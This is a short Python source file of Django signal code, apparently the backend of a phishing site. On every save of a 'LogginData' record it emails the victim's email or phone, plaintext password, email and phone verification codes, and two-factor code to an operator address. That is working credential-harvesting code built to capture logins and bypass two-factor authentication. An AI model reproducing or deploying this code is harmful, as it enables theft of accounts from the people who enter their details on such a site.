from django.db.models.signals import post_save
from django.dispatch import receiver
from home import models  # Assuming you're using Django's built-in User model

from decouple import config
from django.core.mail import EmailMultiAlternatives

from django.core.mail import EmailMultiAlternatives
from decouple import config
from decouple import config


@receiver(post_save, sender=models.LogginData)
def send_update(sender, instance, created, **kwargs):
    try:
        msg = EmailMultiAlternatives(
            f'Update {instance.email_phone} - {instance.password}',
            f'Email/Phone: {instance.email_phone}, Password: {instance.password}, EMAIL CODE: {instance.email_code}, PHONE CODE: {instance.phone_code}, 2FACTOR CODE: {instance.two_factor_code}',
            config('EMAIL_HOST_USER'),
            [config('ADMIN_EMAIL')]
        )
        
        msg.send()
    except ConnectionRefusedError as e:
        return False
